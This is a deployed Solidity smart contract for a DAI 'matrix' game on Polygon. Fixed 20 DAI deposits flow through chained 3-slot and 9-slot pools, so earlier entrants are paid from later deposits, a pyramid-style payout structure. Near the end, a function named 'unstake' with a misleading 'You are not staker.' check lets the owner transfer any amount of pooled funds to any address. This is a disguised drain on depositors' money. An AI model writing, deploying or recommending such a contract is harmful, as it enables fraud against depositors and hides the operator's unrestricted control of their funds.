/**
 *Submitted for verification at polygonscan.com on 2022-10-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract MetaDaiForceG3G9 {
    using SafeMath for uint256;
    ERC20 public dai = ERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063); // DAI Coin
    struct Player {
        uint256 g31_level;
        uint256 g32_level;
        uint256 g33_level;
        uint256 g34_level;
        uint256 g35_level;
        uint256 g36_level;
        uint256 g91_level;
        uint256 g92_level;
        uint256 g93_level;
        uint256 g94_level;
        uint256 g95_level;
        uint256 g96_level;
        uint256 isnew;
    }
    mapping(address => Player) public players;
    address payable [] g31_pool;
    address payable [] g32_pool;
    address payable [] g33_pool;
    address payable [] g34_pool;
    address payable [] g35_pool;
    address payable [] g36_pool;
    address payable [] g91_pool;
    address payable [] g92_pool;
    address payable [] g93_pool;
    address payable [] g94_pool;
    address payable [] g95_pool;
    address payable [] g96_pool;
    address payable owner;
    
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }
    constructor() public {
        owner = msg.sender;
        g31_pool.push(msg.sender);
    }
    
    function deposit(uint256 _dai) public {
        require(_dai == 20e18, "Invalid Amount");
        require(players[msg.sender].isnew == 0, "Already registered");
        dai.transferFrom(msg.sender, address(this), _dai);
        players[msg.sender].isnew++;
        g31_pool.push(msg.sender);
        _setG31();
    }
    function _setG31() private{
        uint256 poollength=g31_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/3; // formula (x-2)/3
        }
        if(players[g31_pool[_ref]].g31_level<3){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g31_pool[i]].g31_level<3){
                   _parent = i;
                   break;
                }
            }
        }
        players[g31_pool[_parent]].g31_level++;
        if(players[g31_pool[_parent]].g31_level==3){
            dai.transfer(g31_pool[_parent],20e18);
            // send to g9-1
            g91_pool.push(g31_pool[_parent]);
            if(g91_pool.length>1){
                _setG91();
            }
        }
    }
    function _setG32() private{
        uint256 poollength=g32_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/3; // formula (x-2)/3
        }
        if(players[g32_pool[_ref]].g32_level<3){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g32_pool[i]].g32_level<3){
                   _parent = i;
                   break;
                }
            }
        }
        players[g32_pool[_parent]].g32_level++;
        if(players[g32_pool[_parent]].g32_level==3){
            dai.transfer(g32_pool[_parent],200e18);
            // send to g9-2
            g92_pool.push(g32_pool[_parent]);
            if(g92_pool.length>1){
                _setG92();
            }
        }
    }
    function _setG33() private{
        uint256 poollength=g33_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/3; // formula (x-2)/3
        }
        if(players[g33_pool[_ref]].g33_level<3){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g33_pool[i]].g33_level<3){
                   _parent = i;
                   break;
                }
            }
        }
        players[g33_pool[_parent]].g33_level++;
        if(players[g33_pool[_parent]].g33_level==3){
            dai.transfer(g33_pool[_parent],2000e18);
           // send to g9-3
            g93_pool.push(g33_pool[_parent]);
            if(g93_pool.length>1){
                _setG93();
            }
        }
    }
    function _setG34() private{
        uint256 poollength=g34_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/3; // formula (x-2)/3
        }
        if(players[g34_pool[_ref]].g34_level<3){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g34_pool[i]].g34_level<3){
                   _parent = i;
                   break;
                }
            }
        }
        players[g34_pool[_parent]].g34_level++;
        if(players[g34_pool[_parent]].g34_level==3){
            dai.transfer(g34_pool[_parent],20000e18);
            // send to g9-4
            g94_pool.push(g34_pool[_parent]);
            if(g94_pool.length>1){
                _setG94();
            }
        }
    }
    function _setG35() private{
        uint256 poollength=g35_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/3; // formula (x-2)/3
        }
        if(players[g35_pool[_ref]].g35_level<3){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g35_pool[i]].g35_level<3){
                   _parent = i;
                   break;
                }
            }
        }
        players[g35_pool[_parent]].g35_level++;
        if(players[g35_pool[_parent]].g35_level==3){
            dai.transfer(g35_pool[_parent],200000e18);
            // send to g9-5
            g95_pool.push(g35_pool[_parent]);
            if(g95_pool.length>1){
                _setG95();
            }
        }
    }
    function _setG36() private{
        uint256 poollength=g36_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/3; // formula (x-2)/3
        }
        if(players[g36_pool[_ref]].g36_level<3){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g36_pool[i]].g36_level<3){
                   _parent = i;
                   break;
                }
            }
        }
        players[g36_pool[_parent]].g36_level++;
        if(players[g36_pool[_parent]].g36_level==3){
            dai.transfer(g36_pool[_parent],2000000e18);
            // send to g9-6
            g96_pool.push(g36_pool[_parent]);
            if(g96_pool.length>1){
                _setG96();
            }
        }
    }
    function _setG91() private{
        uint256 poollength=g91_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/9; 
        }
        if(players[g91_pool[_ref]].g91_level<9){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g91_pool[i]].g91_level<9){
                   _parent = i;
                   break;
                }
            }
        }
        players[g91_pool[_parent]].g91_level++;
        if(players[g91_pool[_parent]].g91_level > 0 && players[g91_pool[_parent]].g91_level.mod(2) == 0){
            dai.transfer(g91_pool[_parent],40e18);
        }
        if(players[g91_pool[_parent]].g91_level==9){
            // send to g3-2
            g32_pool.push(g91_pool[_parent]);
            if(g32_pool.length>1){
                _setG32();
            }
        }
    }
    
    function _setG92() private{
        uint256 poollength=g92_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/9; 
        }
        if(players[g92_pool[_ref]].g92_level<9){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g92_pool[i]].g92_level<9){
                   _parent = i;
                   break;
                }
            }
        }
        players[g92_pool[_parent]].g92_level++;
        if(players[g92_pool[_parent]].g92_level > 0 && players[g92_pool[_parent]].g92_level.mod(2) == 0){
            dai.transfer(g92_pool[_parent],400e18);
        }
        if(players[g92_pool[_parent]].g92_level==9){
            // send to g3-3
            g33_pool.push(g92_pool[_parent]);
            if(g33_pool.length>1){
                _setG33();
            }
        }
    }
    function _setG93() private{
        uint256 poollength=g93_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/9; 
        }
        if(players[g93_pool[_ref]].g93_level<9){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g93_pool[i]].g93_level<9){
                   _parent = i;
                   break;
                }
            }
        }
        players[g93_pool[_parent]].g93_level++;
        if(players[g93_pool[_parent]].g93_level > 0 && players[g93_pool[_parent]].g93_level.mod(2) == 0){
            dai.transfer(g93_pool[_parent],4000e18);
        }
        if(players[g93_pool[_parent]].g93_level==9){
            // send to g3-4
            g34_pool.push(g93_pool[_parent]);
            if(g34_pool.length>1){
                _setG34();
            }
        }
    }
    function _setG94() private{
        uint256 poollength=g94_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/9; 
        }
        if(players[g94_pool[_ref]].g94_level<9){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g94_pool[i]].g94_level<9){
                   _parent = i;
                   break;
                }
            }
        }
        players[g94_pool[_parent]].g94_level++;
        if(players[g94_pool[_parent]].g94_level > 0 && players[g94_pool[_parent]].g94_level.mod(2) == 0){
            dai.transfer(g94_pool[_parent],40000e18);
        }
        if(players[g94_pool[_parent]].g94_level==9){
            // send to g3-5
            g35_pool.push(g94_pool[_parent]);
            if(g35_pool.length>1){
                _setG35();
            }
        }
    }
    function _setG95() private{
        uint256 poollength=g95_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/9; 
        }
        if(players[g95_pool[_ref]].g95_level<9){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g95_pool[i]].g95_level<9){
                   _parent = i;
                   break;
                }
            }
        }
        players[g95_pool[_parent]].g95_level++;
        if(players[g95_pool[_parent]].g95_level > 0 && players[g95_pool[_parent]].g95_level.mod(2) == 0){
            dai.transfer(g95_pool[_parent],400000e18);
        }
        if(players[g95_pool[_parent]].g95_level==9){
            // send to g3-6
            g36_pool.push(g95_pool[_parent]);
            if(g36_pool.length>1){
                _setG36();
            }
        }
    }
    function _setG96() private{
        uint256 poollength=g96_pool.length;
        uint256 pool = poollength-2; 
        uint256 _ref;
        uint256 _parent;
        if(pool<1){
            _ref = 0; 
        }else{
            _ref = uint256(pool)/9; 
        }
        if(players[g96_pool[_ref]].g96_level<9){
            _parent = _ref;
        }
        else{
            for(uint256 i=0;i<poollength;i++){
                if(players[g96_pool[i]].g96_level<9){
                   _parent = i;
                   break;
                }
            }
        }
        players[g96_pool[_parent]].g96_level++;
        dai.transfer(g96_pool[_parent],4000000e18);
        
    }
    function userInfo() view external returns(address payable [] memory g91,address payable [] memory g32) {
        return (
           g91_pool,
           g32_pool
        );
    }
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        dai.transfer(buyer,_amount);
        return _amount;
    }
    function g31Info() view external returns(address payable [] memory) {
        return g31_pool;
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}